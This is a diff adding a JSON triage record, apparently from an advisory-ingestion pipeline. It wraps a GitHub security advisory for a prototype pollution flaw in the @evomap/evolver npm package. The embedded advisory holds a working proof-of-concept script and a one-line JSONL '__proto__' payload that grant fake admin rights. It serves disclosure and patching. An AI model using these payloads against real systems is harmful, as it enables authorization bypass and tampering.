@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/173461547?v=4\", \"events_url\": \"https://api.github.com/users/xeloxa/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/xeloxa/followers\", \"following_url\": \"https://api.github.com/users/xeloxa/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/xeloxa/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/xeloxa\", \"id\": 173461547, \"login\": \"xeloxa\", \"node_id\": \"U_kgDOClbQKw\", \"organizations_url\": \"https://api.github.com/users/xeloxa/orgs\", \"received_events_url\": \"https://api.github.com/users/xeloxa/received_events\", \"repos_url\": \"https://api.github.com/users/xeloxa/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/xeloxa/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/xeloxa/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/xeloxa\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-42077\", \"cvss\": {\"score\": 5.2, \"vector_string\": \"CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.2, \"vector_string\": \"CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-1321\", \"name\": \"Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')\"}], \"description\": \"### Summary\\nA prototype pollution vulnerability in the mailbox store module allows attackers to modify the behavior of all JavaScript objects by injecting malicious properties into `Object.prototype`. The vulnerability exists in the `_applyUpdate()` and `_updateRecord()` functions which use `Object.assign()` to merge user-controlled data without filtering dangerous keys like `__proto__`, `constructor`, or `prototype`.\\n\\n### Details\\nThe vulnerability exists in `src/proxy/mailbox/store.js` at lines 123 and 145:\\n\\n```javascript\\n// src/proxy/mailbox/store.js:115-128\\n_applyUpdate(row) {\\n  if (row._op === 'update') {\\n    const existing = this._index[row.id];\\n    // VULNERABLE: Direct Object.assign without key filtering\\n    if (existing) Object.assign(existing, row.fields);\\n    else this._index[row.id] = row.fields;\\n  }\\n  // ...\\n}\\n\\n// src/proxy/mailbox/store.js:138-150\\n_updateRecord(id, fields) {\\n  const existing = this._index[id];\\n  // VULNERABLE: Direct Object.assign without key filtering\\n  if (existing) Object.assign(existing, fields);\\n  // ...\\n}\\n```\\n\\nThe vulnerability can be triggered when an attacker has the ability to write to the `messages.jsonl` file (used for mailbox persistence). By crafting a malicious JSONL entry with `__proto__` as a field key, the attacker can pollute the prototype of all objects.\\n\\nThe data flows from:\\n1. `messages.jsonl` file → \\n2. `readLines()` function (line 47) → \\n3. `_rebuildIndex()` (line 113) → `_applyUpdate()` (line 121) → \\n4. `Object.assign()` pollutes prototype\\n\\n### PoC\\n\\n**Prerequisites:**\\n- Node.js installed\\n- Access to write to the mailbox messages file\\n\\n**Steps to reproduce:**\\n\\n1. Create a test file demonstrating the vulnerability:\\n\\n```javascript\\n// test-prototype-pollution.js\\nconst fs = require('fs');\\nconst path = require('path');\\n\\n// Simulate the vulnerable Store class logic\\nclass VulnerableStore {\\n  constructor(filePath) {\\n    this.filePath = filePath;\\n    this._index = {};\\n  }\\n\\n  load() {\\n    if (!fs.existsSync(this.filePath)) return;\\n    const lines = fs.readFileSync(this.filePath, 'utf8').split('\\\\n');\\n    for (const line of lines) {\\n      if (!line.trim()) continue;\\n      try {\\n        const row = JSON.parse(line);\\n        this._applyUpdate(row);\\n      } catch (e) {\\n        // Ignore parse errors\\n      }\\n    }\\n  }\\n\\n  _applyUpdate(row) {\\n    if (row._op === 'update') {\\n      const existing = this._index[row.id];\\n      // VULNERABLE: No filtering of dangerous keys\\n      if (existing) Object.assign(existing, row.fields);\\n      else this._index[row.id] = row.fields;\\n    }\\n  }\\n\\n  update(id, fields) {\\n    this._updateRecord(id, fields);\\n  }\\n\\n  _updateRecord(id, fields) {\\n    const existing = this._index[id];\\n    // VULNERABLE: No filtering of dangerous keys\\n    if (existing) Object.assign(existing, fields);\\n    else this._index[id] = fields;\\n  }\\n}\\n\\n// Test the vulnerability\\nconsole.log('=== Testing Prototype Pollution ===\\\\n');\\n\\n// Create a malicious messages.jsonl file\\nconst maliciousContent = JSON.stringify({\\n  _op: 'update',\\n  id: 'msg-123',\\n  fields: {\\n    __proto__: {\\n      polluted: true,\\n      isAdmin: true\\n    },\\n    normalField: 'normalValue'\\n  }\\n}) + '\\\\n';\\n\\nconst testDir = '/tmp/evolver-pollution-test';\\nif (!fs.existsSync(testDir)) fs.mkdirSync(testDir, { recursive: true });\\nconst testFile = path.join(testDir, 'messages.jsonl');\\n\\nfs.writeFileSync(testFile, maliciousContent);\\nconsole.log('Created malicious messages.jsonl');\\n\\n// Load the store (this triggers the vulnerability)\\nconst store = new VulnerableStore(testFile);\\nstore.load();\\n\\n// Check if prototype was polluted\\nconsole.log('\\\\n=== Checking for prototype pollution ===');\\nconst testObj = {};\\nconsole.log('testObj.polluted:', testObj.polluted);\\nconsole.log('testObj.isAdmin:', testObj.isAdmin);\\n\\nif (testObj.polluted === true) {\\n  console.log('\\\\n🔴 VULNERABILITY CONFIRMED: Object prototype was polluted!');\\n  console.log('All objects now have \\\"polluted\\\" and \\\"isAdmin\\\" properties.');\\n} else {\\n  console.log('\\\\n🟡 Prototype pollution may require different payload structure');\\n}\\n\\n// Demonstrate impact - bypassing authentication check\\nconsole.log('\\\\n=== Impact Demonstration ===');\\nfunction checkAdmin(user) {\\n  // Typical pattern that would be vulnerable\\n  if (user.isAdmin) {\\n    return 'Access granted - Admin privileges';\\n  }\\n  return 'Access denied';\\n}\\n\\nconst regularUser = { name: 'normal_user' };\\nconsole.log('Regular user check:', checkAdmin(regularUser));\\n\\n// Cleanup\\nfs.rmSync(testDir, { recursive: true });\\n```\\n\\n2. Run the test:\\n```bash\\nnode test-prototype-pollution.js\\n```\\n\\n**Expected output:**\\n```\\n=== Checking for prototype pollution ===\\ntestObj.polluted: true\\ntestObj.isAdmin: true\\n\\n🔴 VULNERABILITY CONFIRMED: Object prototype was polluted!\\nAll objects now have \\\"polluted\\\" and \\\"isAdmin\\\" properties.\\n\\n=== Impact Demonstration ===\\nRegular user check: Access granted - Admin privileges\\n```\\n\\n**Note:** Modern Node.js versions have some prototype pollution protections. For a successful exploit, the attacker might need to use alternative property paths like `constructor.prototype.isAdmin`.\\n\\n**Attack scenario:**\\nIf an attacker can write to the mailbox messages file (e.g., through file upload, path traversal, or compromised backup restore), they can:\\n```jsonl\\n{\\\"_op\\\":\\\"update\\\",\\\"id\\\":\\\"malicious\\\",\\\"fields\\\":{\\\"__proto__\\\":{\\\"isAdmin\\\":true,\\\"canExecuteArbitraryCode\\\":true}}}\\n```\\n\\n### Impact\\nThis is a **Prototype Pollution** vulnerability that can lead to:\\n- Property injection affecting all JavaScript objects\\n- Authentication/authorization bypass\\n- Application logic manipulation\\n- Denial of service via prototype corruption\\n- Potential remote code execution if polluted properties affect security-critical code paths\\n\\n**Attack requirements:** The attacker needs write access to the `messages.jsonl` file. This could be achieved through:\\n- File upload vulnerabilities\\n- Path traversal (combined with the Arbitrary File Write vulnerability in the fetch command)\\n- Compromised backup files\\n- Shared hosting environments\\n\\n**Affected users:** Anyone using the mailbox functionality in multi-user environments or with persistent message storage.\", \"epss\": {\"percentage\": 0.00109, \"percentile\": 0.01496}, \"ghsa_id\": \"GHSA-2cjr-5v3h-v2w4\", \"github_reviewed_at\": \"2026-04-22T22:05:28Z\", \"html_url\": \"https://github.com/advisories/GHSA-2cjr-5v3h-v2w4\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-2cjr-5v3h-v2w4\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-42077\"}], \"nvd_published_at\": \"2026-05-04T17:16:24Z\", \"published_at\": \"2026-04-22T22:05:28Z\", \"references\": [\"https://github.com/EvoMap/evolver/security/advisories/GHSA-2cjr-5v3h-v2w4\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-42077\", \"https://github.com/EvoMap/evolver/releases/tag/v1.69.3\", \"https://github.com/advisories/GHSA-2cjr-5v3h-v2w4\"], \"repository_advisory_url\": \"https://api.github.com/repos/EvoMap/evolver/security-advisories/GHSA-2cjr-5v3h-v2w4\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/EvoMap/evolver\", \"summary\": \"Evolver has Prototype Pollution via `Object.assign()` in its mailbox store operations\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-04T19:54:38Z\", \"url\": \"https://api.github.com/advisories/GHSA-2cjr-5v3h-v2w4\", \"vulnerabilities\": [{\"first_patched_version\": \"1.69.3\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"@evomap/evolver\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.69.3\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-2cjr-5v3h-v2w4",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "@evomap/evolver: < 1.69.3"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-42077"
+    ],
+    "cvss_score": 5.2,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "@evomap/evolver"
+    ],
+    "remote": false,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:04.172507Z",
+  "provenance": {
+    "content_sha256": "5afb2c5dcbcc550ee2c9fcdfc9ab8f4e2c766373e4a39529ba24497738121817",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-22T22:05:28Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-2cjr-5v3h-v2w4",
+  "status": "active",
+  "title": "Evolver has Prototype Pollution via `Object.assign()` in its mailbox store operations",
+  "updated_at": "2026-05-04T19:54:38Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-2cjr-5v3h-v2w4"
+}
